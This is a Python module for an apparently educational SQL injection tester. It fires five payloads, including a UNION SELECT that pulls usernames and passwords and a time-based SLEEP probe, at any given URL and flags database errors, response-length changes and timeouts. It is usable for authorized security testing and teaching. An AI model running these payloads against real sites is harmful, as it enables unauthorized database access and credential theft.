import requests
from urllib.parse import urljoin
import re
import logging

class SQLiSimulator:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.payloads = [
            "' OR '1'='1",
            "admin' --",
            "' UNION SELECT NULL, username, password FROM users --",
            "' AND SLEEP(2) --",  # Time-based
            "' AND 1=CONVERT(int, @@version) --"  # Error-based
        ]
        
    def test_endpoint(self, target_url, param_name="id"):
        """Test SQL injection vulnerabilities on a target URL"""
        results = []
        results.append(f"Testing SQL Injection vulnerabilities on {target_url}")
        results.append("=" * 50 + "\n")
        
        # Ensure URL has proper scheme
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
            
        try:
            # Test baseline response
            baseline = requests.get(target_url, timeout=5)
            baseline_length = len(baseline.text)
            results.append(f"Baseline response length: {baseline_length} bytes")
            
            for payload in self.payloads:
                results.append(f"\nTesting payload: {payload}")
                results.append("-" * 30)
                
                # Test GET parameter
                test_url = f"{target_url}?{param_name}={payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    # Check for common SQL error messages
                    sql_errors = [
                        "sql syntax",
                        "mysql_fetch",
                        "ORA-",
                        "SQL Server",
                        "mysqli_fetch",
                        "PostgreSQL"
                    ]
                    
                    if any(err.lower() in response.text.lower() for err in sql_errors):
                        results.append("! SQL Error detected - Potential vulnerability!")
                    
                    # Check for significant response length difference
                    if abs(len(response.text) - baseline_length) > 100:
                        results.append("! Response length changed significantly")
                        
                    # Educational notes
                    if "UNION SELECT" in payload:
                        results.append("Note: UNION-based payloads can extract data from other tables")
                    elif "SLEEP" in payload:
                        results.append("Note: Time-based payloads help detect blind SQLi")
                    elif "CONVERT" in payload:
                        results.append("Note: Error-based payloads force database errors to leak info")
                        
                except requests.exceptions.Timeout:
                    if "SLEEP" in payload:
                        results.append("! Timeout occurred - Potential time-based SQLi!")
                except requests.exceptions.RequestException as e:
                    results.append(f"Error testing payload: {str(e)}")
                    
            results.append("\nReminder: Only test on authorized systems!")
            return "\n".join(results)
            
        except Exception as e:
            self.logger.error(f"SQLi testing error: {str(e)}")
            return f"Error during SQLi testing: {str(e)}"